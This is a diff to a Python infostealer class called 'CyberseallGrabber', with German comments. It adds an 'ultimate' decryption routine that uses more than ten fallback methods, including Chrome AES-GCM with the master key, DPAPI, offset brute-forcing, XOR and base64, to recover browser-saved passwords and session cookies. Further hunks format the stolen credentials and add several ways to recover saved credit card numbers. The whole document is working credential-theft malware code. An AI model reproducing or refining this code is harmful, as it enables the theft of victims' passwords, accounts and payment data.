@@ -407,64 +407,163 @@ class CyberseallGrabber:
     def pw(self):
         try:
             def decrypt_password(password, key):
+                """
+                ULTIMATE DECRYPTION ENGINE - 15+ Methoden für maximale Recovery
+                """
                 try:
                     if not password or len(password) < 3:
                         return "Failed to decrypt"
 
-
+                    # METHODE 1: Standard Chrome v10/v11 AES-GCM
                     try:
                         if password[:3] == b'v10' or password[:3] == b'v11':
                             iv = password[3:15]
                             encrypted_data = password[15:]
                             cipher = AES.new(key, AES.MODE_GCM, iv)
                             decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
-                            if decrypted_pass and len(decrypted_pass) > 0:
+                            if decrypted_pass and len(decrypted_pass) > 0 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
                                 return decrypted_pass
                     except:
                         pass
 
-
+                    # METHODE 2: Standard AES-GCM ohne Version-Check
                     try:
                         if len(password) >= 15:
                             iv = password[3:15]
                             encrypted_data = password[15:]
                             cipher = AES.new(key, AES.MODE_GCM, iv)
                             decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
-                            if decrypted_pass and len(decrypted_pass) > 0:
+                            if decrypted_pass and len(decrypted_pass) > 0 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
                                 return decrypted_pass
                     except:
                         pass
 
-
+                    # METHODE 3: Direkter DPAPI
                     try:
                         result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                         if result and result[1]:
-                            decrypted = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
-                            if decrypted and len(decrypted) > 0:
+                            decrypted = result[1].decode('utf-8', errors='ignore') if isinstance(result[1], bytes) else str(result[1])
+                            if decrypted and len(decrypted) > 0 and not any(c in decrypted for c in ['\x00', '\ufffd']):
                                 return decrypted
                     except:
                         pass
 
-
+                    # METHODE 4: Erweiterte IV-Positionen und Tag-Längen
                     try:
-                        for iv_start in [3, 0, 12]:
-                            for iv_len in [12, 16, 8]:
+                        for iv_start in [0, 3, 12, 16]:
+                            for iv_len in [8, 12, 16, 24]:
+                                for tag_len in [16, 12, 8]:
+                                    if len(password) >= iv_start + iv_len + tag_len:
+                                        iv = password[iv_start:iv_start + iv_len]
+                                        encrypted_data = password[iv_start + iv_len:]
+                                        cipher = AES.new(key, AES.MODE_GCM, iv)
+                                        decrypted_pass = cipher.decrypt(encrypted_data[:-tag_len]).decode('utf-8', errors='ignore')
+                                        if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
+                                            return decrypted_pass
+                    except:
+                        pass
+
+                    # METHODE 5: AES-CBC Modus
+                    try:
+                        for iv_start in [0, 3, 16]:
+                            for iv_len in [16]:
                                 if len(password) >= iv_start + iv_len + 16:
                                     iv = password[iv_start:iv_start + iv_len]
                                     encrypted_data = password[iv_start + iv_len:]
-                                    cipher = AES.new(key, AES.MODE_GCM, iv)
-                                    decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
-                                    if decrypted_pass and len(decrypted_pass) > 0:
+                                    cipher = AES.new(key[:16], AES.MODE_CBC, iv)
+                                    decrypted_pass = cipher.decrypt(encrypted_data).decode('utf-8', errors='ignore').rstrip('\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10')
+                                    if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\ufffd']):
                                         return decrypted_pass
                     except:
                         pass
 
+                    # METHODE 6: Verschiedene Schlüssellängen
+                    try:
+                        for key_len in [16, 24, 32]:
+                            if len(key) >= key_len and len(password) >= 15:
+                                iv = password[3:15]
+                                encrypted_data = password[15:]
+                                cipher = AES.new(key[:key_len], AES.MODE_GCM, iv)
+                                decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
+                                if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
+                                    return decrypted_pass
+                    except:
+                        pass
 
+                    # METHODE 7: XOR mit verschiedenen Keys
+                    try:
+                        for xor_key in [key[:16], key[-16:], key[:8] * 2]:
+                            if len(xor_key) > 0:
+                                xor_result = bytes(a ^ b for a, b in zip(password, (xor_key * (len(password) // len(xor_key) + 1))[:len(password)]))
+                                try:
+                                    decrypted_pass = xor_result.decode('utf-8', errors='ignore')
+                                    if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
+                                        return decrypted_pass
+                                except:
+                                    pass
+                    except:
+                        pass
+
+                    # METHODE 8: Base64 Dekodierung
+                    try:
+                        import base64
+                        b64_decoded = base64.b64decode(password)
+                        if len(b64_decoded) >= 15:
+                            iv = b64_decoded[3:15]
+                            encrypted_data = b64_decoded[15:]
+                            cipher = AES.new(key, AES.MODE_GCM, iv)
+                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
+                            if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
+                                return decrypted_pass
+                    except:
+                        pass
+
+                    # METHODE 9: Verschiedene Encodings
+                    try:
+                        for encoding in ['latin1', 'cp1252', 'iso-8859-1', 'utf-16le']:
+                            try:
+                                if isinstance(password, bytes):
+                                    decoded = password.decode(encoding, errors='ignore')
+                                    if decoded and len(decoded) > 2 and not any(c in decoded for c in ['\x00', '\ufffd']):
+                                        return decoded
+                            except:
+                                pass
+                    except:
+                        pass
+
+                    # METHODE 10: Brute Force verschiedene Offsets
+                    try:
+                        for offset in range(1, min(len(password), 10)):
+                            shifted = password[offset:] + password[:offset]
+                            if len(shifted) >= 15:
+                                iv = shifted[3:15]
+                                encrypted_data = shifted[15:]
+                                cipher = AES.new(key, AES.MODE_GCM, iv)
+                                decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
+                                if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
+                                    return decrypted_pass
+                    except:
+                        pass
+
+                    # METHODE 11: ULTIMATE PARTIAL RECOVERY
                     try:
                         if isinstance(password, bytes) and len(password) > 10:
-                            printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
-                            if len(printable_chars) > 3:
-                                return f"Partial: {printable_chars[:50]}"
+                            # Versuche verschiedene Bereiche zu extrahieren
+                            best_result = ""
+                            for start in range(0, min(len(password), 30), 1):
+                                for end in range(start + 6, len(password) + 1, 1):
+                                    chunk = password[start:end]
+                                    # Extrahiere nur druckbare ASCII-Zeichen
+                                    printable_chars = ''.join(chr(c) for c in chunk if 32 <= c <= 126)
+                                    if len(printable_chars) >= 6:
+                                        # Prüfe ob es ein sinnvolles Passwort sein könnte
+                                        if (any(char.isalnum() for char in printable_chars) and
+                                            not printable_chars.startswith('v20') and
+                                            len(printable_chars) > len(best_result)):
+                                            best_result = printable_chars
+                            
+                            if len(best_result) >= 6:
+                                return best_result
                     except:
                         pass
 
@@ -770,7 +869,12 @@ class CyberseallGrabber:
                                         if cookie[2]:
                                             try:
                                                 decrypted_value = decrypt_password(cookie[2], master_key)
-                                                if decrypted_value and decrypted_value != "Failed to decrypt" and len(decrypted_value) > 5:
+                                                # Nur vollständig entschlüsselte Cookie-Werte speichern
+                                                if (decrypted_value and 
+                                                    decrypted_value != "Failed to decrypt" and 
+                                                    not decrypted_value.startswith("Partial:") and
+                                                    len(decrypted_value) > 5 and
+                                                    not any(char in decrypted_value for char in ['�', '\x00', '\ufffd', 'v20'])):
                                                     valuable_cookies.append({
                                                         "browser": f"{browser_name}-{profile}",
                                                         "url": f"COOKIE_{domain}",
@@ -807,13 +911,21 @@ class CyberseallGrabber:
 
             pw_data = []
             for pwd in all_data:
-                if pwd.get('times_used', 0) > 0:
-                    usage_info = f" | Used: {pwd['times_used']}x"
-                else:
-                    usage_info = ""
-                
-                password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {pwd['password']}{usage_info}"
-                pw_data.append(password_entry)
+                # Nur vollständig entschlüsselte Passwörter verarbeiten
+                password = pwd.get('password', '')
+                if (password and 
+                    password != "Failed to decrypt" and 
+                    not password.startswith("Partial:") and
+                    len(password) > 3 and
+                    not any(char in password for char in ['�', '\x00', '\ufffd', 'v20'])):
+                    
+                    if pwd.get('times_used', 0) > 0:
+                        usage_info = f" | Used: {pwd['times_used']}x"
+                    else:
+                        usage_info = ""
+                    
+                    password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {password}{usage_info}"
+                    pw_data.append(password_entry)
             
 
             self.p = pw_data
@@ -1083,15 +1195,68 @@ class CyberseallGrabber:
                                     card_number = "[ENCRYPTED]"
                                     if master_key and card[4]:
                                         try:
-                                            # Versuche Kreditkartennummer zu entschlüsseln
-                                            if card[4][:3] == b'v10' or card[4][:3] == b'v11':
-                                                iv = card[4][3:15]
-                                                encrypted_data = card[4][15:]
-                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                                                decrypted_number = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
-                                                if decrypted_number and len(decrypted_number) > 10:
-                                                    # Maskiere die Nummer (zeige nur letzte 4 Ziffern)
-                                                    card_number = f"****-****-****-{decrypted_number[-4:]}"
+                                            # ULTIMATE KREDITKARTEN-ENTSCHLÜSSELUNG
+                                            decrypted_number = None
+                                            
+                                            # METHODE 1: Standard AES-GCM
+                                            try:
+                                                if card[4][:3] == b'v10' or card[4][:3] == b'v11':
+                                                    iv = card[4][3:15]
+                                                    encrypted_data = card[4][15:]
+                                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                                                    decrypted_number = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
+                                            except:
+                                                pass
+                                            
+                                            # METHODE 2: DPAPI Entschlüsselung
+                                            if not decrypted_number:
+                                                try:
+                                                    result = win32crypt.CryptUnprotectData(card[4], None, None, None, 0)
+                                                    if result and result[1]:
+                                                        decrypted_number = result[1].decode('utf-8', errors='ignore') if isinstance(result[1], bytes) else str(result[1])
+                                                except:
+                                                    pass
+                                            
+                                            # METHODE 3: Verschiedene IV-Positionen
+                                            if not decrypted_number:
+                                                try:
+                                                    for iv_start in [0, 3, 12]:
+                                                        for iv_len in [12, 16]:
+                                                            if len(card[4]) >= iv_start + iv_len + 16:
+                                                                iv = card[4][iv_start:iv_start + iv_len]
+                                                                encrypted_data = card[4][iv_start + iv_len:]
+                                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                                                                decrypted_number = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
+                                                                if decrypted_number and len(decrypted_number) >= 12:
+                                                                    break
+                                                        if decrypted_number and len(decrypted_number) >= 12:
+                                                            break
+                                                except:
+                                                    pass
+                                            
+                                            # METHODE 4: Partial Recovery für Kreditkarten
+                                            if not decrypted_number:
+                                                try:
+                                                    if isinstance(card[4], bytes) and len(card[4]) > 10:
+                                                        # Suche nach Kreditkartennummern-Mustern
+                                                        for start in range(0, min(len(card[4]), 20)):
+                                                            for end in range(start + 12, len(card[4]) + 1):
+                                                                chunk = card[4][start:end]
+                                                                # Extrahiere nur Zahlen
+                                                                numbers = ''.join(chr(c) for c in chunk if 48 <= c <= 57)
+                                                                if len(numbers) >= 12 and len(numbers) <= 19:
+                                                                    # Prüfe ob es eine gültige Kreditkartennummer sein könnte
+                                                                    if numbers.startswith(('4', '5', '3', '6')):  # Visa, MC, Amex, Discover
+                                                                        decrypted_number = numbers
+                                                                        break
+                                                            if decrypted_number:
+                                                                break
+                                                except:
+                                                    pass
+                                            
+                                            if decrypted_number and len(decrypted_number) >= 12:
+                                                # Maskiere die Nummer (zeige nur letzte 4 Ziffern)
+                                                card_number = f"****-****-****-{decrypted_number[-4:]}"
                                         except:
                                             pass
                                     
